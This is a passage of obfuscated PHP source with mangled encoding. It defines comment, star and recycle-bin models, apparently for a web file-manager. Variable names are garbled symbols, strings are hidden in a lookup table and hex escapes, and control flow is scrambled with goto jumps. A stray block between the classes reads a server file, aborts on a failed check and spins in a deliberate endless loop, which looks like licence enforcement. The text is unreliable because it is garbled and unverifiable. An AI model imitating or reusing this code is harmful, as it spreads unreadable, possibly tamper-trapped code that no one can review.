$F∂Ωã÷®¥î->file(); } } goto B‡àû–‘Öä; eﬁ›‡¨ô÷¬: $cØå‡≤ÊÜË =& $_SERVER[’ÿƒ†ïò]; if ($GLOBALS[$cØå‡≤ÊÜË[6]][$cØå‡≤ÊÜË[88]][$cØå‡≤ÊÜË[1753]] != $cØå‡≤ÊÜË[87]) { return !0; } $fËøÙ◊ù—ó = $this->config(); goto a£ê¡©ÓÖè; AØ∂è´ÔÛé: } public function process() { $a≠Ìëäπ¬ê =& $_SERVER[’ÿƒ†ïò]; return array($a≠Ìëäπ¬ê[746] => Task::get($a≠Ìëäπ¬ê[769]), $a≠Ìëäπ¬ê[750] => Task::get($a≠Ìëäπ¬ê[794]), $a≠Ìëäπ¬ê[193] => Task::get($a≠Ìëäπ¬ê[804])); } public function restore() { $e∂ËÕçÃª∫ =& $_SERVER[’ÿƒ†ïò]; ActionCall($e∂ËÕçÃª∫[1047], !0, 1); ActionCall($e∂ËÕçÃª∫[1047], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\164"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\145" => "\143\x6f\155\155\145\156\x74\137\155\145\164\141", "\155\145\x74\x61\106\x69\x65\x6c\x64" => "\143\x6f\x6d\155\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E÷´âç¶£…) { $FßïÚπÓ»÷ =& $_SERVER[’ÿƒ†ïò]; if ($E÷´âç¶£…[$FßïÚπÓ»÷[1754]]) { $AÕòò¯¿ÏÏ = $this->where(array($FßïÚπÓ»÷[1755] => $E÷´âç¶£…[$FßïÚπÓ»÷[1754]]))->find(); if (!$AÕòò¯¿ÏÏ || $AÕòò¯¿ÏÏ[$FßïÚπÓ»÷[406]] != $E÷´âç¶£…[$FßïÚπÓ»÷[406]] || $AÕòò¯¿ÏÏ[$FßïÚπÓ»÷[498]] != $E÷´âç¶£…[$FßïÚπÓ»÷[498]]) { return !1; } $this->where(array($FßïÚπÓ»÷[1755] => $E÷´âç¶£…[$FßïÚπÓ»÷[1754]]))->setAdd($FßïÚπÓ»÷[1756], 1); } $E÷´âç¶£…[$FßïÚπÓ»÷[1757]] = 0; $E÷´âç¶£…[$FßïÚπÓ»÷[1756]] = 0; $E÷´âç¶£…[$FßïÚπÓ»÷[738]] = 1; return $this->add($E÷´âç¶£…); } public function commentCount($E™Õ≥∑àÇÃ, $B«ë§’ÿµØ, $DÏáÜ∂Ìõ = false) { goto D∫Úµó£Óã; c‘Ù≠˘¿’‰: $e˘ê˜ﬁ‡ßµ = array($e≠ê≈íÇ≤[498], $e≠ê≈íÇ≤[1758] => $e≠ê≈íÇ≤[494]); $cèú™ÿÑÜÜ = array($e≠ê≈íÇ≤[498] => array($e≠ê≈íÇ≤[7], $E™Õ≥∑àÇÃ), $e≠ê≈íÇ≤[406] => $B«ë§’ÿµØ); if ($DÏáÜ∂Ìõ) { $cèú™ÿÑÜÜ[$e≠ê≈íÇ≤[1557]] = $DÏáÜ∂Ìõ; } goto E„⁄ôÇêπ«; E„⁄ôÇêπ«: $b¬û©„ˆ¿∑ = $this->field($e˘ê˜ﬁ‡ßµ)->where($cèú™ÿÑÜÜ)->group($e≠ê≈íÇ≤[498])->select(); return array_to_keyvalue($b¬û©„ˆ¿∑, $e≠ê≈íÇ≤[498], $e≠ê≈íÇ≤[494]); goto eîÂ√˜Ù–; D∫Úµó£Óã: $e≠ê≈íÇ≤ =& $_SERVER[’ÿƒ†ïò]; if (!$E™Õ≥∑àÇÃ) { return array(); } if (is_string($E™Õ≥∑àÇÃ) || is_int($E™Õ≥∑àÇÃ)) { $E™Õ≥∑àÇÃ = array($E™Õ≥∑àÇÃ); } goto c‘Ù≠˘¿’‰; eîÂ√˜Ù–: } public function starTarget($A«óâÂå“’, $E’¬ØÛ íù) { goto FŒçîüÛú‘; a»Õâ¯¯°ì: return $this->add($DΩÎ…Ã•Ñ); goto d¶ê≠Øûø»; FŒçîüÛú‘: $bÌ ∂√¶ÿ˘ =& $_SERVER[’ÿƒ†ïò]; $A…”÷¨»ãÏ = $A«óâÂå“’ + self::TYPE_STAR_OFFSET; $Cûìé”ÓÉ˘ = array($bÌ ∂√¶ÿ˘[1557] => USER_ID, $bÌ ∂√¶ÿ˘[406] => $A…”÷¨»ãÏ, $bÌ ∂√¶ÿ˘[498] => $E’¬ØÛ íù); goto cÎÑŸ·∏øı; cÎÑŸ·∏øı: $d“ßπè¢ ≥ = $this->where($Cûìé”ÓÉ˘)->find(); if ($d“ßπè¢ ≥) { return $this->where(array($bÌ ∂√¶ÿ˘[395] => $d“ßπè¢ ≥[$bÌ ∂√¶ÿ˘[395]]))->delete(); } $DΩÎ…Ã•Ñ = array($bÌ ∂√¶ÿ˘[1754] => 0, $bÌ ∂√¶ÿ˘[1557] => USER_ID, $bÌ ∂√¶ÿ˘[738] => 1, $bÌ ∂√¶ÿ˘[743] => $bÌ ∂√¶ÿ˘[33], $bÌ ∂√¶ÿ˘[406] => $A…”÷¨»ãÏ, $bÌ ∂√¶ÿ˘[498] => $E’¬ØÛ íù, $bÌ ∂√¶ÿ˘[1757] => 0, $bÌ ∂√¶ÿ˘[1756] => 0); goto a»Õâ¯¯°ì; d¶ê≠Øûø»: } public function starTargetCount($C©ùÌ–≥áí, $fé≠´ﬁÿôú) { $B≈Ìæù¨Ç„ =& $_SERVER[’ÿƒ†ïò]; $BçÜ–˜ÿ¬• = $fé≠´ﬁÿôú + self::TYPE_STAR_OFFSET; $dó€áé°íé = $this->commentCount($C©ùÌ–≥áí, $BçÜ–˜ÿ¬•); $c˘ç∑‡Ç÷† = $this->commentCount($C©ùÌ–≥áí, $BçÜ–˜ÿ¬•, USER_ID); return array($B≈Ìæù¨Ç„[1759] => $dó€áé°íé, $B≈Ìæù¨Ç„[1760] => $c˘ç∑‡Ç÷†); } public function starTargetUserList($d˘≥†Ó⁄πÔ, $CÈêÔÑ∆Õ€) { goto Fõò⁄ÿëºÚ; Dî¨º±∞ƒπ: return $Dˆí¨ªø≈Ô; goto Fí√úçÿ¶; f◊Ÿÿ˜∆æâ: $DëÈ‘—©•› = $this->field($aÿæä≤ôÉ„[1557])->where($Dåû¢êë∑∫)->limit(500)->select(); $DëÈ‘—©•› = array_to_keyvalue($DëÈ‘—©•›, $aÿæä≤ôÉ„[33], $aÿæä≤ôÉ„[1557]); $Dˆí¨ªø≈Ô[$aÿæä≤ôÉ„[1761]] = Model($aÿæä≤ôÉ„[507])->userListInfo($DëÈ‘—©•›); goto Dî¨º±∞ƒπ; Fõò⁄ÿëºÚ: $aÿæä≤ôÉ„ =& $_SERVER[’ÿƒ†ïò]; $Eö‘ñ÷ŒÑï = $d˘≥†Ó⁄πÔ + self::TYPE_STAR_OFFSET; $Dåû¢êë∑∫ = array($aÿæä≤ôÉ„[498] => $CÈêÔÑ∆Õ€, $aÿæä≤ôÉ„[406] => $Eö‘ñ÷ŒÑï); goto cÇ≈çåûúØ; cÇ≈çåûúØ: $BŒÔüê±ÇÖ = $this->where($Dåû¢êë∑∫)->count(); $Dˆí¨ªø≈Ô = array($aÿæä≤ôÉ„[253] => $BŒÔüê±ÇÖ, $aÿæä≤ôÉ„[1761] => array()); if (!$BŒÔüê±ÇÖ) { return $Dˆí¨ªø≈Ô; } goto f◊Ÿÿ˜∆æâ; Fí√úçÿ¶: } public function prasiseUserList($Cëõõüò‚«) { goto e¥ú¿§¡◊î; EúíÔäÕû : $B˘∑´πê≈î = _get($AÂÓÆ·“™Ë, $BèäπÊàÁ≈[1757], 0); $C≥ö÷≤ê«Á = array($BèäπÊàÁ≈[253] => $B˘∑´πê≈î, $BèäπÊàÁ≈[1761] => array()); if (!$B˘∑´πê≈î) { return $C≥ö÷≤ê«Á; } goto D å¬Ï°†ù; a¿§Œ¯‹Ÿâ: return $C≥ö÷≤ê«Á; goto e≥ÒÛπÿ∏≥; D å¬Ï°†ù: $aêäã‘íü¬ = Model($BèäπÊàÁ≈[1763])->field($BèäπÊàÁ≈[1557])->where($A‡áôÉÏ…£)->limit(500)->select(); $aêäã‘íü¬ = array_to_keyvalue($aêäã‘íü¬, $BèäπÊàÁ≈[33], $BèäπÊàÁ≈[1557]); $C≥ö÷≤ê«Á[$BèäπÊàÁ≈[1761]] = Model($BèäπÊàÁ≈[507])->userListInfo($aêäã‘íü¬); goto a¿§Œ¯‹Ÿâ; e¥ú¿§¡◊î: $BèäπÊàÁ≈ =& $_SERVER[’ÿƒ†ïò]; $A‡áôÉÏ…£ = array($BèäπÊàÁ≈[1762] => $Cëõõüò‚«); $AÂÓÆ·“™Ë = $this->where($A‡áôÉÏ…£)->find(); goto EúíÔäÕû ; e≥ÒÛπÿ∏≥: } public function remove($EØ∞÷çÉˆ„) { $F≥◊…ÇÍúÛ =& $_SERVER[’ÿƒ†ïò]; $d≈∂≈∏˘è˜ = array($F≥◊…ÇÍúÛ[1755] => $EØ∞÷çÉˆ„); $FÑ©Á¨ûúÉ = $this->where($d≈∂≈∏˘è˜)->find(); if ($FÑ©Á¨ûúÉ[$F≥◊…ÇÍúÛ[1754]]) { $this->where(array($F≥◊…ÇÍúÛ[1755] => $FÑ©Á¨ûúÉ[$F≥◊…ÇÍúÛ[1754]]))->setAdd($F≥◊…ÇÍúÛ[1756], -1); } return $this->where($d≈∂≈∏˘è˜)->delete(); } public function edit($d«ûó»ö∂È, $F·‹Ôç◊¶–) { $D“ñ¿Í…ÕÑ =& $_SERVER[’ÿƒ†ïò]; $f¨µ”Òåèä = array($D“ñ¿Í…ÕÑ[1755] => $d«ûó»ö∂È); return $this->where($f¨µ”Òåèä)->save(array($D“ñ¿Í…ÕÑ[1764] => $F·‹Ôç◊¶–)); } public function prasise($DÑâ≤éé°) { $cçﬁÜ⁄‡Õ÷ =& $_SERVER[’ÿƒ†ïò]; $E‰‚¯êãŸ© = Model($cçﬁÜ⁄‡Õ÷[1765]); $f¯ü°œÈÊÉ = array($cçﬁÜ⁄‡Õ÷[1755] => $DÑâ≤éé°, $cçﬁÜ⁄‡Õ÷[1548] => USER_ID); $D‡°ﬁ°ôŒ– = $E‰‚¯êãŸ©->where($f¯ü°œÈÊÉ)->find(); if (!$D‡°ﬁ°ôŒ–) { $E‰‚¯êãŸ©->add($f¯ü°œÈÊÉ); $c¡äßãÖ÷ = $this->where(array($cçﬁÜ⁄‡Õ÷[1755] => $DÑâ≤éé°))->setAdd($cçﬁÜ⁄‡Õ÷[1757], 1); } else { $E‰‚¯êãŸ©->where($f¯ü°œÈÊÉ)->delete(); $c¡äßãÖ÷ = $this->where(array($cçﬁÜ⁄‡Õ÷[1755] => $DÑâ≤éé°))->setAdd($cçﬁÜ⁄‡Õ÷[1757], -1); } return $c¡äßãÖ÷; } public function targetInfo($cüë≤∑ÿΩÓ, $b¿Í˜•ë‚Ö) { goto DÇ£◊§ÖÎ©; dÒ⁄—ÖìôÖ: $d ‰Ω◊ØúŸ = "\122\x49\x47\110\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\164\x5f\160\162\141\151\x73\145\40\x73\164\141\x72\40\x6f\x6e\x20\143\x6f\x6d\155\x65\156\164\x2e\143\157\155\155\x65\x6e\x74\x49\104\x20\x3d\x20\x73\x74\141\x72\56\x63\x6f\x6d\155\x65\156\x74\x49\104"; $cœ∫¯Ü”Ç˘ = $this->alias($D¬ûúÈäç¥[352])->where($c≈√™ü¬à§)->join($d ‰Ω◊ØúŸ, $D¬ûúÈäç¥[1766])->count(); $DﬁÍ‚Û ã€ = array($D¬ûúÈäç¥[1767] => $cåòª√∏Ïº, $D¬ûúÈäç¥[1768] => $cœ∫¯Ü”Ç˘); goto bÁ©òºíì; DÇ£◊§ÖÎ©: $D¬ûúÈäç¥ =& $_SERVER[’ÿƒ†ïò]; $c≈√™ü¬à§ = array($D¬ûúÈäç¥[574] => $cüë≤∑ÿΩÓ, $D¬ûúÈäç¥[575] => $b¿Í˜•ë‚Ö); $cåòª√∏Ïº = $this->where($c≈√™ü¬à§)->count(); goto dÒ⁄—ÖìôÖ; bÁ©òºíì: return $DﬁÍ‚Û ã€; goto b∂Ç™ØâÍÓ; b∂Ç™ØâÍÓ: } public function listData($A¶éüÓ¬œî) { $C≤á≥¥ï∑º =& $_SERVER[’ÿƒ†ïò]; if (isset($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1769]])) { if ($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1769]]) { $A¶éüÓ¬œî[$C≤á≥¥ï∑º[1762]] = array($C≤á≥¥ï∑º[1001], intval($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1769]])); } unset($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1769]]); } if (isset($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1770]])) { if ($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1770]]) { $A¶éüÓ¬œî[$C≤á≥¥ï∑º[1762]] = array($C≤á≥¥ï∑º[998], intval($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1770]])); } unset($A¶éüÓ¬œî[$C≤á≥¥ï∑º[1770]]); } return $this->_listData($A¶éüÓ¬œî); } private function _listData($Fë’üÆ‡¢ı) { $bÉ€¿Ëöû° =& $_SERVER[’ÿƒ†ïò]; $a‚Æ¬çÊ∆∞ = $this->where($Fë’üÆ‡¢ı)->_makeOrder()->selectPage(100); $this->_listAppendParent($a‚Æ¬çÊ∆∞[$bÉ€¿Ëöû°[367]]); $this->_listAppendUser($a‚Æ¬çÊ∆∞[$bÉ€¿Ëöû°[367]]); $this->_listAppendMeta($a‚Æ¬çÊ∆∞[$bÉ€¿Ëöû°[367]]); return $a‚Æ¬çÊ∆∞; } private function _makeOrder() { $F¬πØ«°æ =& $_SERVER[’ÿƒ†ïò]; $d∫¢™Ωî‹° = array($F¬πØ«°æ[1757], $F¬πØ«°æ[1756], $F¬πØ«°æ[194]); $e—óé”áå≠ = Input::get($F¬πØ«°æ[449], $F¬πØ«°æ[7], $F¬πØ«°æ[418], $d∫¢™Ωî‹°); $bêØ∏ÇÎÉ§ = Input::get($F¬πØ«°æ[450], $F¬πØ«°æ[7], $F¬πØ«°æ[1550], array($F¬πØ«°æ[1771], $F¬πØ«°æ[445])); $e¬å«™“Ê‚ = $e—óé”áå≠ . $F¬πØ«°æ[50] . $bêØ∏ÇÎÉ§; return $this->order($e¬å«™“Ê‚); } private function _listAppendParent(&$Bêá◊Œ„úú) { goto e—Õ™Íûÿë; bÂ˘¯Ï¨ƒ∞: foreach ($Bêá◊Œ„úú as &$a∏ÉÉáëÎÎ) { if (isset($Fí¶ï÷¥ã∫[$a∏ÉÉáëÎÎ[$eç¨ÁÛ¿Ùä[1754]]])) { $a∏ÉÉáëÎÎ[$eç¨ÁÛ¿Ùä[1772]] = $Fí¶ï÷¥ã∫[$a∏ÉÉáëÎÎ[$eç¨ÁÛ¿Ùä[1754]]]; } } unset($a∏ÉÉáëÎÎ); goto DŒàˆ´úÉõ; e—Õ™Íûÿë: $eç¨ÁÛ¿Ùä =& $_SERVER[’ÿƒ†ïò]; $EëàÀ¿Ú¯± = array_unique(array_to_keyvalue($Bêá◊Œ„úú, $eç¨ÁÛ¿Ùä[33], $eç¨ÁÛ¿Ùä[1754])); $EëàÀ¿Ú¯± = array_remove_value($EëàÀ¿Ú¯±, $eç¨ÁÛ¿Ùä[191]); goto Bîãé∏åßç; Bîãé∏åßç: if (!$EëàÀ¿Ú¯±) { return; } $Fí¶ï÷¥ã∫ = $this->where(array($eç¨ÁÛ¿Ùä[1755] => array($eç¨ÁÛ¿Ùä[7], $EëàÀ¿Ú¯±)))->select(); $Fí¶ï÷¥ã∫ = array_to_keyvalue($Fí¶ï÷¥ã∫, $eç¨ÁÛ¿Ùä[1762]); goto bÂ˘¯Ï¨ƒ∞; DŒàˆ´úÉõ: } private function _listAppendUser(&$AÍ√⁄ËÎé›) { goto fåŸØ©√€ì; DÖ√øîªê∫: foreach ($AÍ√⁄ËÎé› as &$fû≠ûØ–≠´) { $fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[588]] = $d◊õ”ã‚Ââ[$fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1557]]]; if (isset($fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1772]])) { $fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1772]][$A∂Æ¢∑Ç£ø[588]] = $d◊õ”ã‚Ââ[$fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1772]][$A∂Æ¢∑Ç£ø[1557]]]; } } unset($fû≠ûØ–≠´); goto BÉªÖ»™¯è; cπì¥§Úı¬: if (count($C–ö¬ª≥—) == 0) { return; } foreach ($AÍ√⁄ËÎé› as $fû≠ûØ–≠´) { if (isset($fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1772]])) { $C–ö¬ª≥—[] = $fû≠ûØ–≠´[$A∂Æ¢∑Ç£ø[1772]][$A∂Æ¢∑Ç£ø[1557]]; } } $d◊õ”ã‚Ââ = Model($A∂Æ¢∑Ç£ø[532])->userListInfo($C–ö¬ª≥—); goto DÖ√øîªê∫; fåŸØ©√€ì: $A∂Æ¢∑Ç£ø =& $_SERVER[’ÿƒ†ïò]; $C–ö¬ª≥— = array_unique(array_to_keyvalue($AÍ√⁄ËÎé›, $A∂Æ¢∑Ç£ø[33], $A∂Æ¢∑Ç£ø[1557])); $C–ö¬ª≥— = array_remove_value($C–ö¬ª≥—, $A∂Æ¢∑Ç£ø[191]); goto cπì¥§Úı¬; BÉªÖ»™¯è: } private function _listAppendMeta(&$d—ÏÍèíìﬂ) { goto CÜÇ§«Ç€÷; a∏≥⁄∆∏Üè: if (!$c≥ëÏ¿»ºã) { return !1; } foreach ($d—ÏÍèíìﬂ as &$cÁ¢Ì±ÙÃ®) { $cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[459]] = $c≥ëÏ¿»ºã[$cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1762]]]; if (isset($cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1772]])) { $cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1772]][$c˘âÇ⁄ÊÑ‰[459]] = $c≥ëÏ¿»ºã[$cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1772]][$c˘âÇ⁄ÊÑ‰[1762]]]; } } unset($cÁ¢Ì±ÙÃ®); goto eùÕ≈ªŸúæ; CÜÇ§«Ç€÷: $c˘âÇ⁄ÊÑ‰ =& $_SERVER[’ÿƒ†ïò]; $b¶Ù∏ÊÚíö = array_unique(array_to_keyvalue($d—ÏÍèíìﬂ, $c˘âÇ⁄ÊÑ‰[33], $c˘âÇ⁄ÊÑ‰[1762])); $b¶Ù∏ÊÚíö = array_remove_value($b¶Ù∏ÊÚíö, $c˘âÇ⁄ÊÑ‰[191]); goto f˘ñìŒ…ï«; f˘ñìŒ…ï«: if (!$b¶Ù∏ÊÚíö) { return; } foreach ($d—ÏÍèíìﬂ as $cÁ¢Ì±ÙÃ®) { if (isset($cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1772]])) { $b¶Ù∏ÊÚíö[] = $cÁ¢Ì±ÙÃ®[$c˘âÇ⁄ÊÑ‰[1772]][$c˘âÇ⁄ÊÑ‰[1762]]; } } $c≥ëÏ¿»ºã = $this->metaList($b¶Ù∏ÊÚíö); goto a∏≥⁄∆∏Üè; eùÕ≈ªŸúæ: } private function metaList($e±å¨Õ·’Ú) { goto FÿàÍÌØ–§; b¬©ã´èÍ‘: $aã∂£ß£‡Œ = Model($eΩ∂§˜ß–¬[1773])->where($fßµ⁄˘Ì¿∞)->select(); $aã∂£ß£‡Œ = array_to_keyvalue_group($aã∂£ß£‡Œ, $eΩ∂§˜ß–¬[1762]); foreach ($aã∂£ß£‡Œ as $BÖÂˆù®ëµ => $E›âËØÙ∂‚) { $BâÜÍ´Ÿ„Ú = array(); foreach ($E›âËØÙ∂‚ as $fùÀÆƒåÒŒ) { $BâÜÍ´Ÿ„Ú[$fùÀÆƒåÒŒ[$eΩ∂§˜ß–¬[93]]] = $fùÀÆƒåÒŒ[$eΩ∂§˜ß–¬[372]]; } $aã∂£ß£‡Œ[$BÖÂˆù®ëµ] = $BâÜÍ´Ÿ„Ú; } goto eÂ⁄Âáèüâ; eÂ⁄Âáèüâ: return $aã∂£ß£‡Œ ? $aã∂£ß£‡Œ : array(); goto Eè¡Ÿ„±ª∏; FÿàÍÌØ–§: $eΩ∂§˜ß–¬ =& $_SERVER[’ÿƒ†ïò]; if (!$e±å¨Õ·’Ú) { return array(); } $fßµ⁄˘Ì¿∞ = array($eΩ∂§˜ß–¬[1762] => array($eΩ∂§˜ß–¬[7], $e±å¨Õ·’Ú)); goto b¬©ã´èÍ‘; Eè¡Ÿ„±ª∏: } } goto bπê´áÛôÎ; céØÀÀÍ¿¨: if (!isset($_SERVER[$_SERVER[’ÿƒ†ïò][854]]) || !isset($_SERVER[$_SERVER[’ÿƒ†ïò][861]])) { goto E≤˘ã™≈ö‹; b–ïÜ–Úóã: $Aß≠ª¥âìã($_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]); $B€º≈çîÙû = 2; while ($B€º≈çîÙû > 1) { $AíÓ≠ã≥´Ñ = rawurlencode($B€º≈çîÙû . $_SERVER[’ÿƒ†ïò][376]); } goto báıá∫ä◊ù; E≤˘ã™≈ö‹: $FïÑﬂ√Ñ≥È = $_SERVER[’ÿƒ†ïò][856]; $cÓÉ÷Òœáä = $_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]; $Cü®åû¶ú∏ = $FïÑﬂ√Ñ≥È($cÓÉ÷Òœáä); goto Cß≤≤·∞õ; Cß≤≤·∞õ: $cìŒ”ãë∂ø = explode($_SERVER[’ÿƒ†ïò][229], $Cü®åû¶ú∏); if (count($cìŒ”ãë∂ø) < $_SERVER[’ÿƒ†ïò][601]) { $bøÍØÊ™∫∫ = $_SERVER[’ÿƒ†ïò][859]; $bøÍØÊ™∫∫(); } $Aß≠ª¥âìã = $_SERVER[’ÿƒ†ïò][860]; goto b–ïÜ–Úóã; báıá∫ä◊ù: } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\x63\x65\137\x72\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\151\155\x65", "\164\151\x6d\x65", "\151\156\163\x65\x72\164", "\146\x75\x6e\x63\164\x69\157\156")); public function listData($Aàñ∞–Ê™Û = false) { $cπïïåùÜÈ =& $_SERVER[’ÿƒ†ïò]; $Aàñ∞–Ê™Û = $Aàñ∞–Ê™Û ? $Aàñ∞–Ê™Û : USER_ID; $FÿØ…áÖõ¬ = $this->where(array($cπïïåùÜÈ[1548] => $Aàñ∞–Ê™Û))->select(); return array_to_keyvalue($FÿØ…áÖõ¬, $cπïïåùÜÈ[33], $cπïïåùÜÈ[397]); } public function moveToRecycle($aåÁÍôÇÈÚ) { goto e˜©›ΩÒèÚ; c‚Œ·—Ì≤«: if (!$D√ïøÀêÌ∫ || $D√ïøÀêÌ∫[$BÇñâÕêˆ…[425]] == $BÇñâÕêˆ…[87]) { return; } $a†ÉËÁ‘¯∞ = array($BÇñâÕêˆ…[412] => $aåÁÍôÇÈÚ, $BÇñâÕêˆ…[1548] => USER_ID, $BÇñâÕêˆ…[574] => $D√ïøÀêÌ∫[$BÇñâÕêˆ…[406]], $BÇñâÕêˆ…[575] => $D√ïøÀêÌ∫[$BÇñâÕêˆ…[498]], $BÇñâÕêˆ…[578] => $D√ïøÀêÌ∫[$BÇñâÕêˆ…[515]]); $this->add($a†ÉËÁ‘¯∞); goto B«ƒﬁÚéπı; e˜©›ΩÒèÚ: $BÇñâÕêˆ… =& $_SERVER[’ÿƒ†ïò]; $CÂ±±Ÿü–õ = Model($BÇñâÕêˆ…[1234]); $D√ïøÀêÌ∫ = $CÂ±±Ÿü–õ->sourceInfo($aåÁÍôÇÈÚ); goto c‚Œ·—Ì≤«; B«ƒﬁÚéπı: $this->recycleMove($aåÁÍôÇÈÚ, 1); if ($D√ïøÀêÌ∫[$BÇñâÕêˆ…[405]] == $BÇñâÕêˆ…[87]) { $b•””›á÷° = array($BÇñâÕêˆ…[578] => array($BÇñâÕêˆ…[538], $D√ïøÀêÌ∫[$BÇñâÕêˆ…[515]] . $aåÁÍôÇÈÚ . $BÇñâÕêˆ…[539])); $CÂ±±Ÿü–õ->where($b•””›á÷°)->setField($BÇñâÕêˆ…[425], 1); } goto Câ»¶û⁄»°; Câ»¶û⁄»°: } public function clear() { $this->remove(!1); } public function remove($aä˜ô˜ÓÜÑ = false, $d•É…úáéô = false) { goto A¢éáÑªƒ; Fé‘Ÿ˜ëï‹: foreach ($a‹ÚΩÆ˜õ  as $eÁ”‰ﬂÉ§Ù) { if ($aä˜ô˜ÓÜÑ != !1 && !in_array($eÁ”‰ﬂÉ§Ù, $aä˜ô˜ÓÜÑ)) { continue; } $c√èàÂê•∏ = $C≠ïãΩÊàÌ->sourceInfo($eÁ”‰ﬂÉ§Ù); $C≠ïãΩÊàÌ->remove($eÁ”‰ﬂÉ§Ù, !1); $dÀ∏¥‰∏∑Ö = $c√èàÂê•∏[$a£Ûë¯Ω „[406]] . $a£Ûë¯Ω „[71] . $c√èàÂê•∏[$a£Ûë¯Ω „[498]]; $aä ·◊‹≈ä[$dÀ∏¥‰∏∑Ö] = array($a£Ûë¯Ω „[574] => $c√èàÂê•∏[$a£Ûë¯Ω „[406]], $a£Ûë¯Ω „[498] => $c√èàÂê•∏[$a£Ûë¯Ω „[498]]); $this->where(array($a£Ûë¯Ω „[397] => $eÁ”‰ﬂÉ§Ù))->delete(); } foreach ($aä ·◊‹≈ä as $Eñêä¢∑Œã) { $C≠ïãΩÊàÌ->targetSpaceUpdate($Eñêä¢∑Œã[$a£Ûë¯Ω „[406]], $Eñêä¢∑Œã[$a£Ûë¯Ω „[498]]); } goto F¬Ü£Øüëñ; Aä•©º≈ê·: $a‹ÚΩÆ˜õ  = $this->listData($d•É…úáéô); $aä˜ô˜ÓÜÑ = $aä˜ô˜ÓÜÑ === !1 ? !1 : $aä˜ô˜ÓÜÑ; $aä ·◊‹≈ä = array(); goto Fé‘Ÿ˜ëï‹; A¢éáÑªƒ: $a£Ûë¯Ω „ =& $_SERVER[’ÿƒ†ïò]; $d•É…úáéô = $d•É…úáéô ? $d•É…úáéô : USER_ID; $C≠ïãΩÊàÌ = Model($a£Ûë¯Ω „[1234]); goto Aä•©º≈ê·; F¬Ü£Øüëñ: } public function restore($B€π∑Â©‰§ = false) { $E°’ﬂ¿∑çç = $this->listData(); $this->_restoreSource($E°’ﬂ¿∑çç, $B€π∑Â©‰§); } public function removeUserAll($C„Ÿ»öÈÃ∑) { $this->remove(!1, $C„Ÿ»öÈÃ∑); } private function _restoreSource($AÒû‚±Ûµ¶, $AÚ‹≥≥™õ´) { goto AûÁØÁˆ◊É; a˜°ØÉäÇ‘: $Dî—¶ÛÏ‰ò->updateModifyTime($c∑¥ìÏÊò˜); goto Fº∑ùÑæ∑©; AûÁØÁˆ◊É: $Bª°Œõ≥⁄ı =& $_SERVER[’ÿƒ†ïò]; $Dî—¶ÛÏ‰ò = Model($Bª°Œõ≥⁄ı[1234]); $AÚ‹≥≥™õ´ = $AÚ‹≥≥™õ´ == !1 ? !1 : $AÚ‹≥≥™õ´; goto b™Óç’ôﬁø; b™Óç’ôﬁø: if (!$AÒû‚±Ûµ¶) { return !0; } $c∑¥ìÏÊò˜ = array(); foreach ($AÒû‚±Ûµ¶ as $Fí«Ú©ï›Ú) { goto eÈëÔ©˜ Õ; f«ó®Ë⁄ﬂæ: if ($a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[405]] == $Bª°Œõ≥⁄ı[87]) { $aÉËØ±πéŒ = array($Bª°Œõ≥⁄ı[578] => array($Bª°Œõ≥⁄ı[538], $a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[515]] . $Fí«Ú©ï›Ú . $Bª°Œõ≥⁄ı[539])); $Dî—¶ÛÏ‰ò->where($aÉËØ±πéŒ)->setField($Bª°Œõ≥⁄ı[425], 0); $this->restoreFolderChildren($Fí«Ú©ï›Ú, $AÒû‚±Ûµ¶); } $this->where(array($Bª°Œõ≥⁄ı[397] => $Fí«Ú©ï›Ú))->delete(); $Dî—¶ÛÏ‰ò->folderSizeReset($a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[492]]); goto F¯∫ÂøáŒÈ; F¯∫ÂøáŒÈ: $c∑¥ìÏÊò˜[] = $a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[492]]; if ($a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[405]] == $Bª°Œõ≥⁄ı[87]) { $c∑¥ìÏÊò˜[] = $Fí«Ú©ï›Ú; } $Dî—¶ÛÏ‰ò->lockMoveEnd($Fí«Ú©ï›Ú); goto D≠√ââçè¶; cóÿŒ∏ì¬Ô: if ($Eó´õó¬Î[$Bª°Œõ≥⁄ı[425]] == $Bª°Œõ≥⁄ı[87]) { continue; } $Dî—¶ÛÏ‰ò->lockMoveStart($Fí«Ú©ï›Ú); $this->recycleMove($Fí«Ú©ï›Ú, 0); goto 